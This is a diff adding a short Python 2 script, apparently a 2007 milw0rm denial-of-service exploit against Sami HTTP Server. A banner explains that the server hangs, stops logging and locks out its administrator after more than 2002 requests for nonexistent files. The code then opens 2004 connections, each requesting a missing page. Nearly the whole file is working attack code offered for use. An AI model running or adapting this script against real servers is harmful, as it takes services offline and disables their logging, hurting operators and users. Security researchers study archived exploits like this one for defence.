@@ -1,0 +1,35 @@
+#!/usr/bin/env python
+import socket
+
+print "-----------------------------------------------------------------------"
+print "Sami HTTP Server HTTP 404 - Object not found Denial of Service"
+print "url: http://www.karjasoft.com"
+print "author: shinnai"
+print "mail: shinnai[at]autistici[dot]org"
+print "site: http://shinnai.altervista.org"
+print ""
+print "The server is unable to handle more than 2002 requests to nonexistents"
+print "files, pages, folders etc."
+print "When the number of requests exceed the 2002, it stops to answer,
+stops"
+print "to write to log file and the admin will be unable to kick or ban
+users."
+print "The only thing you can do is to kill the process."
+print "-----------------------------------------------------------------------"
+
+host = "127.0.0.1"
+port = 80
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+try:
+   conn = s.connect(("127.0.0.1",80))
+   for i in range (0,2004):
+       request =  "GET /some.txt HTTP/1.0 \n\n"
+       connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+       connection.connect((host, port))
+       connection.send(request)
+       print i
+except:
+   print "Unable to connect. exiting."
+
+# milw0rm.com [2007-01-23]
